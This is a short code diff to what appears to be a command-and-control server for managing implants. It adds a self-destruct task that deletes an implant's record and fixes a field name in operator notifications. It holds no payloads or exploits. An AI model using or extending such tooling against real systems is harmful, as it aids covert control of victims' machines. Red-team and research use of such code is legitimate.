@@ -167,6 +167,16 @@ def get_task():
         task.status = TASKED
         db.session.commit()
         return task.to_filtered_json()
+
+    # If the task was a SELFDESTRUCT, delete the implant
+    if task is not None and task.command == "SELFDESTRUCT":
+        # Delete the implant
+        to_delete = Implant.query.filter_by(implant_id=implant_id).first()
+        if to_delete is None:
+            return jsonify({"status": False, "msg": "Unknown implant"}), 400
+        db.session.delete(to_delete)
+        db.session.commit()
+
     # If task is None, return empty task
     return jsonify({})
 
@@ -217,7 +227,7 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
         db.session.commit()
 
         op = Operator.query.filter_by(username=task.operator_name).first()
-        send_message_to_operator(op, f"Task {task.tid} completed")
+        send_message_to_operator(op, f"Task {task.task_id} completed")
 
         return "OK"
     # If task is None, return empty task
